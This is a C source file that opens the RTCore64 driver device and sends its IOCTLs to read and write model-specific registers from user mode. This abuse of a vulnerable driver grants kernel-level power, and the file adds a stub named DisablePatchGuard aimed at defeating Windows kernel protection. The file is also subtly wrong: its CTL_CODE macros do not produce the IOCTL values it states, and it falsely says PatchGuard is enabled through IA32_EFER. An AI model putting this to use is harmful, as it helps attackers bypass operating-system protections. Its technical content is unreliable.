#include "driver_loader.h"

//
// RTCore64 IOCTL interface for Model-Specific Register (MSR) access.
//
// RTCore64.sys provides two primary IOCTLs:
//   IOCTL_RTCORE_READMSR  = 0x80002040
//   IOCTL_RTCORE_WRITEMSR = 0x80002044
//
// Input/Output structs match the RTCore64 driver convention.
//

//
// Structure for MSR read IOCTL.
// Input:  Register (DWORD)
// Output: Value   (DWORD64)
//
#pragma pack(push, 1)
typedef struct _MSR_READ_INPUT {
    DWORD Register;    // MSR register index (e.g. 0x199 for IA32_MISC_ENABLE)
    DWORD Reserved;    // Padding
} MSR_READ_INPUT, *PMSR_READ_INPUT;

typedef struct _MSR_READ_OUTPUT {
    DWORD64 Value;     // MSR value read
} MSR_READ_OUTPUT, *PMSR_READ_OUTPUT;
#pragma pack(pop)

//
// Structure for MSR write IOCTL.
// Input: Register (DWORD) + Value (DWORD64)
//
#pragma pack(push, 1)
typedef struct _MSR_WRITE_INPUT {
    DWORD   Register;  // MSR register index
    DWORD   Reserved;  // Padding
    DWORD64 Value;     // Value to write
} MSR_WRITE_INPUT, *PMSR_WRITE_INPUT;
#pragma pack(pop)

#define IOCTL_RTCORE_READMSR   CTL_CODE(0x8000, 0x2040, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_RTCORE_WRITEMSR  CTL_CODE(0x8000, 0x2044, METHOD_BUFFERED, FILE_ANY_ACCESS)

static HANDLE g_MsrDeviceHandle = INVALID_HANDLE_VALUE;

//
// Initialize the MSR interface by opening a handle to RTCore64 device.
//
BOOL
MsrInit(VOID)
{
    g_MsrDeviceHandle = CreateFileA(
        "\\\\.\\RTCore64",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    return (g_MsrDeviceHandle != INVALID_HANDLE_VALUE);
}

//
// Read a Model-Specific Register.
// Returns TRUE on success, FALSE on failure (use GetLastError for details).
//
BOOL
ReadMsr(
    _In_ DWORD Register,
    _Out_ PDWORD64 Value
    )
{
    MSR_READ_INPUT  input;
    MSR_READ_OUTPUT output;
    DWORD           bytesReturned = 0;
    BOOL            result;

    if (Value == NULL) {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    if (g_MsrDeviceHandle == INVALID_HANDLE_VALUE) {
        SetLastError(ERROR_INVALID_HANDLE);
        return FALSE;
    }

    input.Register = Register;
    input.Reserved = 0;

    result = DeviceIoControl(
        g_MsrDeviceHandle,
        IOCTL_RTCORE_READMSR,
        &input,
        sizeof(input),
        &output,
        sizeof(output),
        &bytesReturned,
        NULL
    );

    if (result) {
        *Value = output.Value;
    }

    return result;
}

//
// Write a Model-Specific Register.
// WARNING: Writing certain MSRs can crash the system.
// Returns TRUE on success.
//
BOOL
WriteMsr(
    _In_ DWORD Register,
    _In_ DWORD64 Value
    )
{
    MSR_WRITE_INPUT input;
    DWORD           bytesReturned = 0;
    BOOL            result;

    if (g_MsrDeviceHandle == INVALID_HANDLE_VALUE) {
        SetLastError(ERROR_INVALID_HANDLE);
        return FALSE;
    }

    input.Register = Register;
    input.Reserved = 0;
    input.Value    = Value;

    result = DeviceIoControl(
        g_MsrDeviceHandle,
        IOCTL_RTCORE_WRITEMSR,
        &input,
        sizeof(input),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    return result;
}

//
// Close the MSR device handle.
//
VOID
MsrCleanup(VOID)
{
    if (g_MsrDeviceHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(g_MsrDeviceHandle);
        g_MsrDeviceHandle = INVALID_HANDLE_VALUE;
    }
}

//
// Convenience: Disable Kernel Patch Protection (KPP / PatchGuard)
// by writing to the appropriate MSR on x64 systems.
// WARNING: Extremely dangerous; use only in test environments.
//
BOOL
DisablePatchGuard(VOID)
{
    //
    // On x64 Windows, PatchGuard is enabled via MSR 0xC0000080 (IA32_EFER).
    // The actual PG-disable mechanism varies by Windows version.
    // This is a research stub — PatchGuard defeat is non-trivial.
    //
    // Modern approach: Disable PG via VMX root (hypervisor) not MSR.
    //
    SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
    return FALSE;
}
